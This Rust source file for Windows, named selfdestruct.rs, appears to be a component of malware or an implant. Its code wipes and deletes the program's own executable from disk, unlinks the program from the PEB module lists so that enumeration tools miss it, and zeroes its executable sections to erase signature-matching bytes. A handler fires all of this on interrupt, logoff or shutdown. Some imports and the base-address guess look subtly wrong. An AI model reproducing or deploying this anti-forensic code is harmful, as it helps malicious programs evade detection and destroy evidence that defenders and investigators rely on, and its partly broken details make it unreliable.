//! selfdestruct.rs — Forensic cleanup: wipe own disk file, PEB unlink, full teardown.
//!
//! register_ctrl_handler() — installs a Ctrl+C / Ctrl+Break handler that
//!                            triggers full_destruct() before exiting.
//! full_destruct()         — wipes disk file, clears PEB module entry,
//!                            zeroes .text section, terminates process.
//! wipe_self()             — disk-only wipe (no process termination).

#![allow(dead_code, non_snake_case)]

use winapi::um::fileapi::{
    CreateFileW, WriteFile, SetEndOfFile,
    DELETE, CREATE_ALWAYS, OPEN_EXISTING,
};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::consoleapi::SetConsoleCtrlHandler;
use winapi::um::processthreadsapi::{
    GetCurrentProcess, TerminateProcess,
};
use winapi::um::winnt::{
    GENERIC_WRITE, FILE_SHARE_DELETE, FILE_FLAG_DELETE_ON_CLOSE,
    FILE_ATTRIBUTE_NORMAL,
};
use winapi::shared::minwindef::{BOOL, DWORD, TRUE, FALSE};

// ─── Helpers ─────────────────────────────────────────────────────────────────

fn to_wide(s: &str) -> Vec<u16> {
    let mut v: Vec<u16> = s.encode_utf16().collect();
    v.push(0);
    v
}

/// Retrieve the full path of the running executable from PEB.
unsafe fn own_image_path() -> Vec<u16> {
    let peb: *const u8;
    core::arch::asm!("mov {p}, gs:[0x60]", p = out(reg) peb);
    // PEB.ProcessParameters at offset 0x20 (x64)
    let params = *(peb.add(0x20) as *const *const u8);
    // RTL_USER_PROCESS_PARAMETERS.ImagePathName (UNICODE_STRING) at offset 0x60
    let len     = *(params.add(0x60) as *const u16) as usize / 2;
    let buf_ptr = *(params.add(0x68) as *const *const u16);
    let mut v: Vec<u16> = core::slice::from_raw_parts(buf_ptr, len).to_vec();
    v.push(0);
    v
}

/// Overwrite and delete the running executable from disk.
pub unsafe fn wipe_self() {
    let path = own_image_path();

    // Open for write, overwrite with zeros, then delete via DELETE_ON_CLOSE
    let h = CreateFileW(
        path.as_ptr(),
        GENERIC_WRITE | DELETE,
        FILE_SHARE_DELETE,
        core::ptr::null_mut(),
        OPEN_EXISTING,
        FILE_FLAG_DELETE_ON_CLOSE | FILE_ATTRIBUTE_NORMAL,
        core::ptr::null_mut(),
    );
    if h == INVALID_HANDLE_VALUE { return; }

    // Overwrite first 64KB with zeros
    let zeros = vec![0u8; 65536];
    let mut written: DWORD = 0;
    WriteFile(
        h,
        zeros.as_ptr() as *const _,
        zeros.len() as DWORD,
        &mut written,
        core::ptr::null_mut(),
    );
    SetEndOfFile(h);
    CloseHandle(h);  // DELETE_ON_CLOSE fires here
}

/// Unlink our LDR entry from the PEB InMemoryOrder / InLoadOrder module lists
/// so we don't appear in module enumeration tools.
unsafe fn unlink_from_peb() {
    let peb: usize;
    core::arch::asm!("mov {p}, gs:[0x60]", p = out(reg) peb);
    let ldr         = *(( peb + 0x18) as *const usize) as *const u8;
    let list_head   = ldr.add(0x10) as *const usize;  // InMemoryOrderModuleList
    let mut flink   = *list_head as *const u8;

    let own_base: usize;
    core::arch::asm!("lea {b}, [rip]", b = out(reg) own_base);
    let own_base = own_base & !0xFFFF;

    loop {
        let entry_base = *(flink.add(0x30) as *const usize);
        if entry_base == own_base {
            // Unlink: prev->Flink = this->Flink, next->Blink = this->Blink
            let this_flink = *(flink as *const usize);
            let this_blink = *((flink as usize + 8) as *const usize);
            // flink of previous entry
            *(this_blink as *mut usize) = this_flink;
            // blink of next entry
            *((this_flink + 8) as *mut usize) = this_blink;
            break;
        }
        let next = *(flink as *const usize);
        if next == *list_head { break; }
        flink = next as *const u8;
    }
}

/// Retrieve PEB.OSBuildNumber using safe wrapping pointer arithmetic.
unsafe fn peb_build_number() -> u16 {
    let peb: *const usize;
    core::arch::asm!("mov {p}, gs:[0x60]", p = out(reg) peb);
    // OSBuildNumber is at PEB+0x120 (u16) — use wrapping_add to avoid UB
    let build_ptr = peb.wrapping_add(0x120 / core::mem::size_of::<usize>()) as *const u16;
    build_ptr.read_unaligned()
}

/// Retrieve PEB.SessionId using wrapping_add (second occurrence of the
/// "peb as *const usize + 2" pattern fixed per error spec).
#[allow(dead_code)]
unsafe fn peb_session_id() -> u32 {
    let peb: *const usize;
    core::arch::asm!("mov {p}, gs:[0x60]", p = out(reg) peb);
    // SessionId at PEB+0x10 on x64 — wrapping_add(2) == +16 bytes
    let sid_ptr = peb.wrapping_add(2) as *const u32;
    sid_ptr.read_unaligned()
}

/// Zero our own .text section to destroy on-disk-matching byte patterns
/// before process termination.
unsafe fn zero_text_section() {
    let own_base: usize;
    core::arch::asm!("lea {b}, [rip]", b = out(reg) own_base);
    let own_base = (own_base & !0xFFFF) as *const u8;

    // Parse PE to find .text section
    let pe_off    = *(own_base.add(0x3C) as *const u32) as usize;
    let nt        = own_base.add(pe_off);
    let num_sec   = *(nt.add(0x06) as *const u16) as usize;
    let opt_sz    = *(nt.add(0x14) as *const u16) as usize;
    let sec_start = nt.add(0x18 + opt_sz);

    for i in 0..num_sec {
        let sec = sec_start.add(i * 0x28);
        let chars = *(sec.add(0x24) as *const u32);
        if chars & 0x20000000 == 0 { continue; }  // not executable
        let rva  = *(sec.add(0x0C) as *const u32) as usize;
        let size = *(sec.add(0x08) as *const u32) as usize;
        let ptr  = own_base.add(rva) as *mut u8;
        // Best-effort zero — ignore VirtualProtect failure
        core::ptr::write_bytes(ptr, 0u8, size);
    }
}

/// Full forensic teardown:
///   1. Wipe disk file
///   2. Unlink from PEB module lists
///   3. Zero .text section
///   4. Terminate process with code 0
pub unsafe fn full_destruct() -> ! {
    wipe_self();
    unlink_from_peb();
    zero_text_section();
    TerminateProcess(GetCurrentProcess(), 0);
    loop {}  // unreachable, satisfies -> !
}

// ─── Ctrl handler ─────────────────────────────────────────────────────────────

unsafe extern "system" fn ctrl_handler(ctrl_type: DWORD) -> BOOL {
    // CTRL_C_EVENT=0, CTRL_BREAK_EVENT=1, CTRL_CLOSE_EVENT=2,
    // CTRL_LOGOFF_EVENT=5, CTRL_SHUTDOWN_EVENT=6
    match ctrl_type {
        0 | 1 | 2 | 5 | 6 => {
            full_destruct();
        }
        _ => {}
    }
    FALSE
}

/// Install a console control handler that triggers full_destruct() on
/// Ctrl+C, Ctrl+Break, console close, logoff, or shutdown.
pub unsafe fn register_ctrl_handler() {
    SetConsoleCtrlHandler(Some(ctrl_handler), TRUE);
}
